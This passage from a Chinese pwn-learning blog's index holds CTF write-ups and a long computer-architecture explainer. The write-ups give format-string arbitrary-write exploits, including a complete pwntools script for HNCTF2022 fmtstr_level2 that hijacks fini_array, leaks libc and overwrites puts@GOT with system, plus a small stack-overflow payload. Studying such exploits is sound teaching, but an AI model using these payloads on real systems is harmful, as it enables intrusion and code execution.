data})\noffset就是我们需要更改内容的地址距离esp的偏移\naddr就是我们需要改写内容的地址\ndata就是我们需要改写的数据\n来看一下接下来的exp可以怎么写\nfrom pwn import*io = remote(&quot;node4.buuoj.cn&quot;,25117)io.recvuntil(&quot;your name:&quot;)payload=fmtstr_payload(10,&#123;0x804C044:1&#125;)io.sendline(payload)io.recvuntil(&quot;your passwd:&quot;)io.sendline(&quot;1&quot;)io.recv()io.interactive()\n\n可以看到，我们就这样轻易的将addr处的随机数更改为了1\n是不是比之前的两种payload构造办法简单许多？\n","categories":["栈"]},{"title":"格式化字符串任意写&泄露基址","url":"/2022/10/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%BB%E6%84%8F%E5%86%99-%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80/","content":"本篇主要讲述两个知识点： 格式化字符串任意写和泄露基址\n我们在最初的格式化字符串漏洞学习中 已经掌握了查看偏移和篡改地址的数据的能力\n但是如果是篡改puts函数的got表呢？\n我们知道 动态链接的情况下 当我们调用一个函数时\n他会寻址其got表内存储的真实地址(即对应函数在libc文件中的地址) 从而成功调用\n如果我们将其got表内存储的真实地址修改为其他函数的真实地址\n那么当程序调用原函数时 就相当于调用了篡改后的函数\npayload = fmtstr_payload(offset, &#123;puts_got:system_addr &#125;)\n\n以上述payload为例 假设我们需要修改puts函数的got表 使其为system函数的地址\n那么我们就可以这样构造payload(这里注意一下，fmtstr这个工具是会自己补齐字长的 这将影响到我们下文中一道例题 现在留个意就行了)\nps:并且这个工具默认生成的是32位情况下 如果需要切换到64位 需要自己手动添加\ncontext.arch = &quot;amd64&quot;\n\n但是一般题目除非出题人好心 不然真实地址还是得我们自己泄露的吧\n那如何一并利用格式化字符串泄露函数的真实地址呢？\n还记不记得 格式化字符串最开始的漏洞利用 就是泄露栈上的内容 如果我们将got表写入栈上 那是不是也可以通过格式化字符串漏洞将其泄露出来？\npayload = b&quot;%n$s&quot;.ljust(16,b&quot;\\x00&quot;)+p64(puts_got)\n\n这里有几点要注意一下 一个是n 注意是地址所在的偏移\n还有一点是格式化字符这里选择的是s \n最后一个疑惑在于为什么要用\\x00补齐16个字节 这个我也不懂 死记就完事了(你也可以试试不补齐 然后看会泄露个啥出来)\n好了 接下来用一题例题来演示一下 方便理解(例题还涉及到了fini劫持的知识点 不懂的话建议先去看另外一篇)\nHNCTF2022-[WEEK2]fmtstr_level2附件有给libc文件 猜测要用到泄露基址\nchecksec看一下进制和保护\n\n有canary 要么泄露绕过 要么就不能栈溢出了\n再看一下程序\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[296]; // [rsp+0h] [rbp-130h] BYREF  unsigned __int64 v5; // [rsp+128h] [rbp-8h]  v5 = __readfsqword(0x28u);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  puts(&quot;Welcome to the game of formatting strings&quot;);  puts(&quot;Be careful, you only get one shot at this game&quot;);  puts(&quot;First please tell me your game ID&quot;);  read(0, buf, 0x100uLL);  printf(buf);  puts(&quot;Okk,try to hack it;sh&quot;);  return 0;&#125;\n\n唯一看起来有价值的就只有main函数了 没有任何的后门函数 甚至buf的字节也不够栈溢出\n但是注意看 最后的puts输出的字符串有sh\n那么可以猜测出题目的解法是修改got表\n结果我们只有一次格式化字符串任意写的机会 好像并不能满足泄露地址后再修改got表的需求\n但是如果我们将fini_array的值改为main函数 那么程序结束后 就会重新返回到main函数 那么我们就有了第二次利用格式化字符串的机会\n于是解题思路可以分为两步\n1.修改fini_array和泄露函数真实地址\n2.将puts_got修改为system函数\n那么接下来开始编写exp\ngdb查看了偏移以后 发现我们输入的第一个字长的数据位于偏移6的地方\n第一个payload的难点在于搞清楚两个格式化字符串的偏移和payload的结构\npayload = fmtstr_payload(6, &#123;fini_addr:main_addr&#125;)payload += b&quot;%17$s&quot;.ljust(16,b&quot;\\x00&quot;)+p64(puts_got)  //6+8（第一行payload字节数64）+2+1\n\n按照我们上文所说的是不是应该这么构造payload 但是你会发现最后泄露出来的地址是\n\naaaaba+fini_array的地址(0x4031f0)\n前面的aaaaba是什么东西？\n我们打印出fmtstr构造的数据看看\n\n可以看到aaaaba出自这里 这里就是我们上文所说到的fmtstr的自动补齐一个字长\n而后面的\\x00也是为了传送地址(但是地址只有三字节 所以需要5个\\x00才补齐一个字长)\n那么说回我们刚才的错误 其原因在于我们需要将格式化字符串放在一起 地址放在一起\n才能两次利用一个漏洞点\n所以 正确的payload应该把aaaaba替换成泄露地址的格式化字符串\npayload = b&quot;%182c%11$lln%91c%12$hhn%47c%13$hhn%14$sa\\xf01@\\x00\\x00\\x00\\x00\\x00\\xf11@\\x00\\x00\\x00\\x00\\x00\\xf21@\\x00\\x00\\x00\\x00\\x00&quot;payload += p64(puts_got)\n\n但是这里我们会发现 recv接收到的数据太多了 像ret2libc中的接收办法显然是会出错的\nputs_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;))\n\n这里用到[-6:]   只接收后六个字节\n那么我们此时成功进行了fini劫持 我们再输入io.recv()就会发现又接收到了main函数开始时puts的那些字符串\n第二次的payload就简单至极了 最后放下完整的exp吧\nfrom pwn import*context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;io = remote(&quot;1.14.71.254&quot;,28466)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)io.recvuntil(&quot;First please tell me your game ID&quot;)fini_addr = 0x4031F0main_addr = 0x4011b6ret_addr = 0x40101aputs_got = elf.got[&#x27;puts&#x27;]payload = b&quot;%182c%11$lln%91c%12$hhn%47c%13$hhn%14$sa\\xf01@\\x00\\x00\\x00\\x00\\x00\\xf11@\\x00\\x00\\x00\\x00\\x00\\xf21@\\x00\\x00\\x00\\x00\\x00&quot;payload += p64(puts_got)io.sendline(payload)io.recv()puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;))libc_addr = puts_addr - libc.sym[&#x27;puts&#x27;]hex(libc_addr)system_addr = libc_addr + libc.sym[&#x27;system&#x27;]io.recv()io.recvuntil(&quot;First please tell me your game ID&quot;)payload = fmtstr_payload(6,&#123;puts_got:system_addr&#125;)io.sendline(payload)io.interactive()\n\n","categories":["栈"]},{"title":"溢出覆盖变量","url":"/2022/10/03/%E6%BA%A2%E5%87%BA%E8%A6%86%E7%9B%96%E5%8F%98%E9%87%8F/","content":"其实这个知识点应该算是栈溢出后面就可以讲的了 顺序没把握好 不过还好这篇的例题有点干货 就不丢到基础知识扩展那个专题了 在这面说吧\n我们已经学习了基础的栈溢出对吧 总归就是覆盖栈上的高地址内的数据 通常我们都是用一些没有意义的垃圾数据去覆盖他\n但是有些题目 就可能会故意刁难我们\n比如下面这题\n\n是吧 他都把var[13]赋值为了0 结果要var[13]&gt;0并且&#x3D;17才能达到我们系统调用的目的\n这怎么整？\n我们唯一的输入点就在第十行 其中肯定有漏洞\n%s 读入字符串数据 注意这里的是%s 我们刚开始提到的干货就是这个\nps:这里我也理解不了 感兴趣的可以自己看大佬博客：\npwn中str()与p64() - ATKevin - 博客园 (cnblogs.com)\n不然就是记个结论 %s就得用p32&#x2F;p64 传输数据\n也就是说我们在覆盖var[13]时 需要注意不能用b””或者是str()\n说回题目\nscanf没有对输入的字节长度进行限制 存在了栈溢出漏洞\n我们只需要用垃圾数据填充var数组的前13个数据 然后用17填充var[13]\n当然 这里还得注意一下\nchar类型的数组的每个值都是一个字节长度的 而这题并不是char类型的数组  所以我们应该用一个字长去覆盖一个数组元素\n所以这里我们的payload应该写成\npayload = cyclic(13*4)+p32(17)\n\n当然也可以写成\npayload = p32(1)*13+p32(17)\n\n这样我们就成功覆盖了var[13]的值为17了\n","categories":["栈"]},{"title":"计组原理","url":"/2022/12/14/%E8%AE%A1%E7%BB%84%E5%8E%9F%E7%90%86/","content":"前言已经学习了pwn一段时间 自从开始接触堆以后 就越发感觉计组原理的重要性 终有一日也是要自己读源码 自己挖洞的 所以从现在开始扎实基础知识\n并且同时在刷c语言题的时候 遇到了Segmentation Fault的报错 打算弄懂 没想到这一下子就是扯出一整块知识\n本篇的篇幅将会十分长 将从0开始写起 梳理和补缺知识点 并且由于是构建一个逻辑性的知识梳理 所以不会像wiki一样详细 可能大部分是一个体系的指导或者记录一些难懂的知识点\n并且这种基础知识 不同于呆板的文科学习 如果只是背诵八股文 那么依然达不到用处\n希望读者阅读完整篇后 能够形成自己的理解 \n并且 本文一部分是参照着&lt;&lt;小林图解计算机&gt;&gt;来写的 建议还是去看他的 能够梳理更清楚的框架\nLinux内核1你可以把linux内核理解为一个中介 其负责硬件和软件的通信\n对应用程序来说 他有什么请求的时候就会将其通过内核传递给硬件 而内核又充当一个底层驱动程序 对设备和组件进行寻址 并且内核是应用程序逻辑上的最底层\n同时 内核也相当于一个库 系统调用即是通过这个库实现 应用程序进行系统调用就像调用普通函数一样\n\n如图所示 为GNU&#x2F;linux的基本体系结构 蓝色部分是用户空间 下方是内核空间\n内核空间的最上方是系统调用接口 下面依次是通用的内核代码和特殊的内核代码(略)\n内核也可以拆分成两部分 微内核和宏内核\n微内核又可以称为中央内核 内核的一些基本操作是基于其实现的 其他的功能是交给一些独立进程 这些进程通过特定的通信接口和内核通信\n宏内核 你可以将其理解为一个整体 一个文件 其包含了内核的所有代码和五个子系统 在宏内核中 任意一个函数都可以访问到内核的任意地方 \n五个子系统分别是 进程调度 内存管理 虚拟文件系统 网络接口和进程间通信\n其中比较重要的是进程调度和内存管理两个系统 这里拿出来说说 其他的可自行了解\n进程调度：linux系统是一个动态的系统 怎么理解这句话 其通过不断变化的各种进程来适应不断变化的计算需求\n也就是说 linux中的所有操作 你都可以将其视为一个进程\n比如说 我接下来编译如下的二进制文件\n#include&lt;stdio.h&gt;int main()&#123;close(1);close(2);system(&quot;/bin/sh&quot;);return 0;&#125;\n\n按理来说应该会直接进行了系统调用 随后我们直接cat flag就能获取flag了是吧 但是运行之后发现\n\n没有回显 这是因为关闭了文件描述符1和2 其对应着标准输出和标准错误 文件描述符相当于一个索引值 其代表的是一个进程 也就是说 在当前终端 输出(即与屏幕的通信接口)被关闭了 这个进程被中断了 那么这里可以用重定向(不解释)\n回归正文 linux中的所有进程都源于一个父进程 即fork函数 先调用了这个函数 然后才有了其他的子进程\n并且 每一个子进程都有其自己的PID(可以理解为名字) 比如我们可以用 ps -e来查看当前所有的进程\n\n(进程数量过多 这里仅仅这是截取了开头的小部分)\n不过这里的PID在进程结束以后 是可以被其他的进程获取的 即其是重复使用的\n可见进程对于linux系统的重要性 所以 内核中的其他四个子系统都是依赖于进程调度的 通过其来挂起或者恢复进程\n当一个进程需要用到其不能得到的资源时 他会调起其他的进程 而自己会进入睡眠状态 分为两种:可被打断的睡眠和不可被打断 区别在于字面意思 收到信号以后 前者就会恢复进程\n当然了 进程的信息肯定不单单只有PID 其还包括进程的优先级、地址的空间等信息 这些内容都会存储在其(单个进程)的一个独立的数据结构中 这个结构称为进程控制块 进程管理也就是管理这些块\n内存管理: 提起内存 那么牵扯到的东西就多了 小到cpu的缓存 大到虚拟内存 需要极大的篇幅来叙述 所以我们接下来将偏移正文很长时间 来从0朔源起内存这一个概念\n内存最早的图灵机也有内存的概念 如果其要计算1+1 那么就会将1 + 1这三个放上带子 随后由读写头读入到控制器中\n\n这一点和现如今使用的I&#x2F;O总线类似 其分为地址总线 数据总线 控制总线\n数据总线将读写到的数据传输给控制总线(I&#x2F;O总线不在这里展开)\n这一做法主要是因为数据的读取速度远远慢于计算速度 并且这样可以减少读取数据的次数\n做个直观的比喻 你掉落了100根牙签在地上，没有缓冲区的情况是\n你弯腰捡完一根牙签就起身把他放回桌子上，接下来继续重复流程\n而有了缓冲区以后，你弯腰捡完牙签，你会先把他放在手上，等手中的牙签数量足够多的时候，你才会起身放回桌面\ncpu中的缓存概念也类似于上述\ncpu拥有三级缓存 简称为 L1 L2 L3\n每级缓存逐渐递增缓存量 而读取速度逐渐减少\nL1和L2是每一个cpu核心所特有的 而L3通常是几个核心共用\n这三级缓存采用的SRAM(静态存储器) 其特点是价格高昂 并且断电后数据就会消失 但是因为其优秀的读取速度 被广泛运用在cpu缓存中\n这里额外提一嘴扩展 我们经常会听到cpu超频 这个说法还得从cpu如何执行指令说起\n在很多非科班的编程语言培训和你第一节计算机导论课上都会提到 低级语言和高级语言 你只知道一个概念 就是计算机读不懂你写的程序 比如c语言\n他需要经过编译 将其转化成计算器能读懂的机器码\n这其中的过程可不是能简单用编译两个字来概括的\n就比如用gcc来编译一个c语言程序举例 \n我们编写了一个输出hello world的程序 接着编译这个程序 他会经历四个阶段 : 预处理阶段 编译阶段 汇编阶段 链接阶段\n预处理阶段: 这个阶段主要是将我们程序调用的头文件插入到程序文本中 接着由a.c得到a.i 文件扩展名发生了变化\n编译阶段: 生成了一个汇编语言程序 文件扩展名变成了s 并且每条汇编语句还对应着一条低级机器语言\n汇编阶段: 将文件翻译成机器语言 打包在一个可重定位的二进制文件中 后缀名变为o （这里的可重定位你可以理解为是为了接下来的链接）\n链接阶段: 将文件进行静态链接或者动态链接 区别在于是否通过libc库调用函数(如果pwn学到了ret2libc 应该对这块的过程很了解 这里不过多赘述)\n接着 这些机器指令被传给了计算机 他需要经历三个阶段 才能从接收到实现 ： Fetch（取指）Decode（译码）Execute（执行指令）\n具体的功能不过多赘述 不过从字面意思应该也能理解各步骤的作用\ncpu实现这些步骤也是需要时间的 所花费的时间以时间周期为基本单位来衡量 而cpu的主频就是cpu运算速度的单位，cpu的运算速度单位有MHz、GHz，其中GHz&#x3D;1024MHz\n但是并不意味着主频越大 cpu的性能越好 这还要参考指令集 发热 等等因素\n接着我们说回到内存 基础的我就懒得写了 毕竟好理解 网上资料也多 实在不行我的个人博客里也有提到内存地址之类的概念\n为什么会有虚拟内存这个概念？当我们电脑的物理内存不够时 虚拟内存机制可以支持计算机在硬盘中划出一块空间来充当内存使用\n并且多个程序可以共有同一块内存区 大大提高了计算机的运算性能和效率\n虚拟内存的实现有三种方式 分页 分段 段页式\n分页:\n以下所叙述的 前提是没有开启虚拟存储机制(不赘述 自行了解)\n接下来我们清楚两个主角 物理内存和虚拟内存\n所谓的分页是将这二者划分成大小相同的”块” 前者称为页框 后者为页面\n而虚拟内存是远远大于物理内存的 所以其分配到的”块”是不能都有对应的物理内存的\n为什么这么说？ 我们先得了解cpu的寻址是如何计算的 用32位cpu举例来说 \n这里引入一个概念 I&#x2F;O总线\nI&#x2F;O总线三种总线: 地址总线 数据总线 控制总线\n这里只介绍第一种 地址总线\n最底层的数据是通过高低电压来传输的\n 比如说想要传输5这个值 那么就需要三个电压 101 如果只有一条地址总线 那么需要传输三次 \n这样一位一位传输的方式，称为串行，下一个 bit 必须等待上一个 bit 传输完成才能进行传输\n要想提高效率 就需要增加地址总线 \n但是也不能无脑增加 32位的cpu自身的位宽只有32 要想让他跨级传输64位甚至更多的地址位宽\n这明显是不现实的 所以最好的情况下是cpu的位宽刚好和地址位宽一致 所以32位cpu能够寻址到的内存大小是4gb\nps: 这一块不懂的可以看一下下面这段 截取自《小林图解计算机》\n\n如果地址总线只有 1 条，那每次只能表示 「0 或 1」这两种地址，所以 CPU 能操作的内存地址最大数量为 2（2^1）个（注意，不要理解成同时能操作 2 个内存地址）；\n如果地址总线有 2 条，那么能表示 00、01、10、11 这四种地址，所以 CPU 能操作的内存地址最大数量为 4（2^2）个。\n\n说回到虚拟内存为什么比物理内存大得多\n32位的情况下 物理内存最大支持4GB 但是虚拟内存是每个进程所独立拥有的 这样才能确保虚拟内存地址不冲突 而进程是不会只有一个的\n所以这种情况下 势必会出现虚拟内存的页面对应不上物理内存的页框\n这种问题称为缺页中断 出现这种情况时 系统会从物理内存中挑选一个使用最少的页框 将其内容存放回硬盘 这样就腾出了一个新的页面 接着重新映射到这个空闲的页\n我们所提到的这些操作 是由MMU（内存管理单元）来实现的 包括映射和虚拟内存的分配\n了解一下就好 扩展的话自己百度百度吧\n接下里的内容就需要带脑子看了 虽然说一直都需要脑子 我们来介绍一下 虚拟内存的页面是如何索引到物理内存的\n每一个虚拟地址都由两部分组成 页号和页内偏移 页号是页表的索引 页表中存储的是物理内存每页框的基地址 这个类似于libc基址 页内偏移加上页表中的基地址 就索引到了物理地址\n然后页表实际上是存储在MMU中 这里的索引其实有点类似于ret2dl的知识点 虽然说这个github上有很多开源的工具可以做到脚本攻击 但是建议还是自己去阅读理解\n但是这样的索引机制其实存在一个缺陷 假设32位的情况下 虚拟内存有4GB 假设一个页为4kb 那么就分成了一百万个页 就对应着一百万个页表 页表存储的是物理内存地址的基址 32位情况下需要4字节 这就需要4MB\n你会觉得这样也很小 占用不到哪里去 但是你要知道计算机在运行时一般不会只有一个进程 如果你上面按照我说的查看了你虚拟机里的所有进程 你就会知道这个4MB会被乘以多少\n为了解决这个问题 还有一种多项页表\n还是按照上文的数据假设 对于一个进程来说 一共有4mb的一百万个页表项 如果这些页表继续进行页号的索引 即形成二级页表 \n二级页表仍然由页表项索引指向一级页表 分配方案为 1024个二级页表 每个页表中仍然有1024个页表项 这样可以索引到1,048,576个一级页表\n但是你想 一级页表占用4kb 其进行了二级页表分页后 二级页表的大小是4MB 那这样不多了内存吗？\n但是 你要知道不是每个进程都会占用4GB的虚拟内存 往往会剩余很多 我们一级页表是为了覆盖整个物理内存 才需要不管其有没有占用满 都需要一一对应上\n但是二级页表不用这种担心 所以其实大部分情况下 二级页表是分配不到那么多的 所以实际上 增加二级页表机制以后\n一个进程所需要的页表项空间为： 4KB+(二级页表占用率)x4MB 得到的值是小于原本的4MB的 这样子就成功节约了空间\n下面为补充知识 个人认为可掌握可不掌握\n\n上图是页表项的详细结构 其中 页框号就是页号 用来索引物理内存地址 相当重要\n“在&#x2F;不在”位的值是一个布尔类型 1时代表此页表项所指引的页框不在虚拟内存上 如果调用到了这个页表项 就会触发缺页中断\n保护位字面意思 用来防止非法调用 上图是比较低级的页表项 好的页表项还会有三位 代表可读 可写 可执行\n修改位 如果这个页表项所指引页面被修改了 那么其对应在硬盘上的值也必须被修改 如果没有 那么这个页面就可以直接被丢弃 差不多你可以理解为 你在玩游戏 你使用了一个道具 那么虚拟内存调用到这个的时候 就会把你硬盘中道具的\n分段:\n这一部分还是很简单的 至少对于分页来说\n将虚拟内存分为了多个段落 并且每个段落的长度并不是相等的 这部分和glibc内存管理是一样的 这里就不重复说了 讲一点不一样的\n和分页机制类似 分段机制下的虚拟内存地址也包括两个部分 段选择子和段内偏移量\n段选择子是段表的索引 而段表中存储的值是这个段映射的物理内存地址的基地址\n加上段内偏移量后 就是物理内存地址\n但是不同于分页的是 段存在着很大的缺陷 就是内存碎片的问题\n因为段所对应的物理内存并不会是连续的一块空间 这么说不好理解 举个例子\n一共有1024mb的内存空间 浏览器占了512mb 视频播放器128mb 图片管理器占了256mb\n这时候如果把视频播放器的进程终止了 按理来说应该还有128mb(原本空余剩下的)+128mb(视频播放器腾出来的)\n但是我们仍然打不开一个256mb的进程\n因为这里的256mb的内存并不是连续的 中间是断开的\n这就出现了外部内存碎片\n那么相对的 还有内部内存碎片 比如我们打开一个视频播放器 但是我们实际上使用的内存只有几十mb 但是这个进程占用的高达256mb \n这就出现了内存的浪费\n并且分段机制下的内存交换的效率还很低\n什么是内存交换 当我们出现了外部内存碎片的情况下 解决办法就是将图片管理器的内存接到浏览器的后面\n先把这一块内存写到硬盘上 再读取回来 就接在了浏览器的后面\n但是由于这样的内存交换需要将整个进程和硬盘交互 但是我们前面已经讲过了 硬盘的读写速度是远远比不上内存的 所以会被效率造成严重的拖累\n段页式:\n字面意思 结合了分段和分页两种机制的一种虚拟内存分配方式\n其将虚拟内存按照逻辑 分段后 再段中分页 然后和物理内存对应 这样的优点就是又有分段试的管理又有分页式的调用\n缺点就是在调用的过程中要不断的查表 既有段表又有页表 增加了硬件成本\n接下来详细介绍一下段页式内存映射的原理\n虚拟内存这回由三部分构成 段号 段内页号 页内偏移\n有了前面的基础 这回就很好理解了\n内存先访问段表 然后访问页表 接着加上页内偏移 就得到了物理内存地址\n到这里我们就已经普及完了内存的一些知识点 理解完这些你应该对内存差不多有了大概的概念 接着我们说回到linux内核的子系统之一内存管理\nLinux内核232位计算机的情况下 linux的虚拟内存分为两个部分 一是3GB大小的用户空间 二是1GB大小的内核空间\n内核空间是所有进程所共享的\nLinux内核所需求的内存一般都是以字节为单位 所以对于使用分页机制来说 若直接分配一页内存 会造成内存浪费\n于是有一个叫slab分配器的东西 来专门负责小内存分配\n不过其依然是通过申请大内存 然后对自己申请来的内存进行细分管理\n除了分配小内存外 其还有第二个作用 就是提供一个类似于堆块缓存区的东西\n(给不是pwn手的简单介绍一下堆块缓存区bins 就是比如说申请了一个范围大小的chunk 将其释放以后 其不会回到原本的内存里面 会被放到大小对应的垃圾桶(bins) 如果下次调用小于或者等于(并不是都适用的 要分辨是哪种bins) 就会从bins中分配)\n这样子的好处就是当内核频繁调用小内存时 可以快速分配对象 提高效率\n不过总得用slab分配器的术语来描述一下:\nslab维护着对象的缓存 内核中有些结构 初始化所花费的时间高于为其分配空间的时间 所以就会新增一个slab使用构造函数为其初始化\n即使这个结构被释放了  他也会保持初始化状态 下次生成就不用初始化\n如果你会一点汇编 你会发现 经常性的会出现地址跳转的指令 比如此时正在执行0x1000地址处的指令 现在要跳转到0x1100\n你以为只是很简单的跳转？ 其实不然 原理涉及到了slab的着色机制\n我们前面已经说了 cpu有自己的三级缓存 在执行指令时 一级缓存是交互最快的地方 而缓存中调用地址是采取缓存行的形式\n比如说此时缓存行一行是64字节 那么:\n\n再假设此时读取的物理内存基址是0x1000 那么第0缓存行读取的地址范围就是0x1000~0x1040\n但是这时候要调用0x1100地址处的指令呢 是不是就得将0x1000-0x1040物理内存地址的数据写回硬盘 然后载入0x1100-0x1140\n但是这样子如果频繁调用的话 效率太低 造成大量的时间消耗 于是采取了slab着色 为0x1100带上偏移 这样子计算的时候就可以代入到第1缓存行 这样子就不用频繁交换\n所以着色其实就是加上偏移 只不过不同对象的偏移不一样 颜色也不一样\nps:slab内容远远不及于此 但是我感觉深究下去也不是个头 并且现阶段没有必要了解那么深 所以点到为此\nCPU首先需要知道cpu是怎么执行程序的\nCPU又称中央处理器 字面意思是计算机的核心 和人脑一样的地位 其内部包括许多零件 诸如寄存器 控制单元 逻辑运算单元等\n其中寄存器负责管理运算数据的存储 以及指令地址和指令内容 分别由三种寄存器种类存储:\n通用寄存器 程序计数器 指令寄存器\n并且cpu拥有自己的缓存区 称为cache 分别有L1 L2 L3 \n其中L1缓存区分为指令缓存和数据缓存 二者大小一致\ncpu对于cache的读写速度远远大于内存 而上述三个cache 随着数字的增大 缓存空间逐渐增加 读写速度逐渐降低\ncpu可以拥有多个核心 而每个核心都有自己特有的L1 L2 cache，L3 cache是所有核心所共享的\ncpu和计算机的交互是通过IO总线来实现的 IO总线分为 地址总线 控制总线 数据总线\n当cpu读写数据的时候 先通过地址总线来确定目标的地址 再通过控制总线决定是写入还是写出 最后由数据总线传输数据\ncpu是如何执行程序的呢?\n如果你学过学校教的计算机组成原理 你应该知道冯诺依曼模型 cpu执行程序相当于一行一行执行代码 而执行代码又是将一行代码拆分成指令和数据\n其中数据的总类也很多样 全局变量和局部变量 二者还可以延申出不同的数据类型 int double等\n例如puts函数输出的字符串也是数据 其会保存在rodata段\n指令实际上是一串二进制的机器码 每条指令都有各自的机器码 cpu通过解析机器码来了解指令需求\n指令的机器码解析由cpu的指令集负责 而不同的cpu的指令集不同 也就对应不同的汇编语言和机器码\n下面举例MIPS指令集来解析一下指令的机器码的构造\n\nMIPS指令集一共有三种格式 每种格式的长度都为32位\n前六位是操作码 用来表示该指令作用 后26位根据不同格式构造不同\nR格式用于逻辑和算术运算\n\n划分出来的六个区块大小分别为6 5 5 5 5 6位 如果操作码不够描述指令 函数码也可以用来描述\nI格式用于数据传输和条件分支\n\nJ格式用于跳转地址 构成是三者中最简单的 除了操作码其余都是跳转的地址\n\n举一个R类型的指令 比如add $0,$1,$2\n目标寄存器为$0 第一个操作数是$1 第二个操作数是$2 add的操作码为0 函数码为32\n所以指令编码后转化成的机器码为 000000 00001 00010 00000 00000 32\ncpu解析指令后将其分为数据段和正文段 数据段用来存放变量等 正文段用来存放指令\ncpu有一个专门用来存放指令地址的 称其为程序计数器 其存放的指令地址为下一个要执行的指令\ncpu先根据程序计数器索引指令 随后通过控制单元操控地址总线访问对应地址 随后利用数据总线传输数据到对应寄存器\n接着程序计数器自增 自增大小根据操作系统位数有关 为一个字长\n随后程序根据指令类型判断 如果为计算类型的指令 交给逻辑运算单元 如果是存储类型交给控制单元\n大部分cpu遵从的是四个固定步骤来执行指令 分别是取指令 指令译码 执行指令 数据回写\n取指令(Fetch): 通过程序计数器读取指令地址\n指令译码(Decode): 对指令进行解码\n执行指令(Execution): cpu执行指令\n数据回写(Store): 程序将数据写回对应寄存器或者内存\n我们称上述四个步骤为指令周期\ncpu执行每一个步骤的时间称为时钟周期  如果时钟频率越快 时钟周期就越短 cpu的执行速度也越快\n时钟频率和cpu的主频相关 也就是我们常说的几GHZ\n比如2.4GHZ 代表着一秒可以触发2.4G次的脉冲信号 每一次脉冲信号的高低电频转化就是一次时钟周期\n另外 cpu为什么还存在原码 补码 反码\n原码是对于计算机中二进制的一种表达方式 首位额外增加了符号位 正数是0 负数是1\n比如10进制数字1用源码表示就是000000001\n但是原码不能直接用于计算 比如两个十进制数字1+(-1)&#x3D;0\n如果整个计算过程用原码来表示的话就是\n000000001 + 100000001 &#x3D; 100000010\n最后的结果是-2 明显计算错误 因此计算机用补码来表达负数\n所谓补码就是把负数的原码全部取反再加上1\n所以-1的补码就是 011111111\n而反码就是原码向补码转化的过度值 也就是还没有加上1时的数值 比如-1的反码是011111110\n接下来我们再来讲一下二进制是如何表示小数的\n10.625这个数 在二进制中实际上是1010.101\n小数点前面的是正数幂 后则是负数幂\n1010.101转化为十进制是\n但是你会发现也有很多数 比如0.1是不能用二进制表示完全的 这种时候就会产生偏差 如果将二进制的0.1转化回十进制\n得到的值是近似于0.1的 0.0001100110…….\n我们提到过的二进制数1010.101如果用规格化存储 得到是1.010101 x 2*3 其中010101称之为尾数 3为指数 用来规范小数点的位置\n更多细节这里不扩展 感兴趣的可以去这个博客了解\n2.7 为什么 0.1 + 0.2 不等于 0.3 ？ | 小林coding (xiaolincoding.com)\n接着我们来利用下面的这个程序进入cpu cache的存储内容\n#include&lt;stdio.h&gt;int main()&#123;    int a[20]=&#123;1,2,3&#125;;    printf(&quot;%d&quot;,a[0]);&#125;\n\n当cpu执行printf语句的时候 需要将a[0]的值读入cache 但是cpu并不能刚好读入单个数据或者是刚好适应不同调用情况的字节数据 其单次读写数据的单位是cache line 上文讲述slab着色器的时候也说到过了 这里复述的详细一点\n假设此cpu的cache line是64字节 那么当其需要a[0]数据的时候 会把a[0]后面的数据也一并读入 直到满足64字节 \n第一块64字节的数据会被放置为cache line 0  当需要更多字节的数据的时候 就会依法炮制 放置在cache line1 如此递增\n假设cache一共有8行 而内存被分为了32个块 这也就意味着必然会有两块以上的内存共用一块cache line\n其遵守的是取模运算 比如说第15个内存块 实际上对应的是第7个cache line\n而cpu为了避免搞混单个cache line中的不同内存块 在对应的cache line中还存储了tag标记 相当于slab着色器\n除了tag标记外 cache line中还存储着两个重要信息 一个是有效位 一个是偏移量\n有效位为0时 不管cache中是否有需要的内存数据 仍然会去内存中读取\n偏移量的存在则是因为cpu所需的内存数据并不一定都是刚好一个cache line 就比如说上面的程序\n所需的仅仅是cache line中的一个内存片段 也就需要偏移量来界定一个范围\ncache line是为了避免频繁的cpu访问内存带来的读写效率降低\n但是其存在着一个缺陷 也就是意味着一块cache line中可能并不全是所需要的数据 出现了缓存命中率的问题 其又分为数据缓存命中率和指令缓存命中率\n先说数据缓存命中率吧 来看下面的一个程序\n#include&lt;stdio.h&gt;int main()&#123;    int a[5][20];    for(int i=0;i&lt;5;i++)&#123;        printf(&quot;%d &quot;,a[0][i]);    &#125;    putchar(10);    for(int i=0;i&lt;5;i++)&#123;        printf(&quot;%d &quot;,a[i][0]);    &#125;&#125;\n\n你觉得哪一个for循环执行所消耗的时间会更加短 是第一个? 那为什么呢\n其调用的数据在内存地址中都是连续的 也就意味着单次的cache line写入就可以做到覆盖所有要调用的数据\n而第二个for循环调用的数据是间断的 需要花费更多的时间在cpu和内存的交互中\n当我们需要遍历数组这种情况时 最好选择连续的内存空间 可以有效提高程序的运行时间和数据缓存命中率\n而指令缓存命中率是什么呢？\n还是先看一下下面的程序\n#include&lt;stdio.h&gt;int main()&#123;    int a[20];    // 数组a进行一个随机赋值 这里不演示出来    for(int i=0;i&lt;20;i++)&#123;        if(a[i]&gt;0)&#123;            a[i]=0;        &#125;else&#123;            continue;        &#125;    &#125;&#125;\n\n当数组a进行了赋值后 步入if判断分支 请问是先对数组a中的数据进行一个排序后再判断所消耗的时间快还是直接进行判断\n回答这个问题之前我们首先要了解 cpu拥有一个分支预测器 如果cpu能够预测到接下来是步入if语句的哪个分支 就会提前把指令(在这里也就是a[i]&#x3D;0)放入到cache中 于是执行速度就会加快\n那么显然 先进行排序再步入if判断语句就可以提高判断后赋值的效率\n当我们在实际编写程序的时候 如果你可以确保哪一个步入哪一个分支的概率较高 你可以使用likely和unlikely两种宏\n#define likely(x)__builtin_expect( !!(x),1)#define unlikely(x) __builtin_expect( ! !(x),0)#include&lt;stdio.h&gt;int main()&#123;    int a[20];    for(int i=0;i&lt;20;i++)&#123;        if(likely(a[i]&lt;100))&#123;            puts(&quot;a&quot;);        &#125;    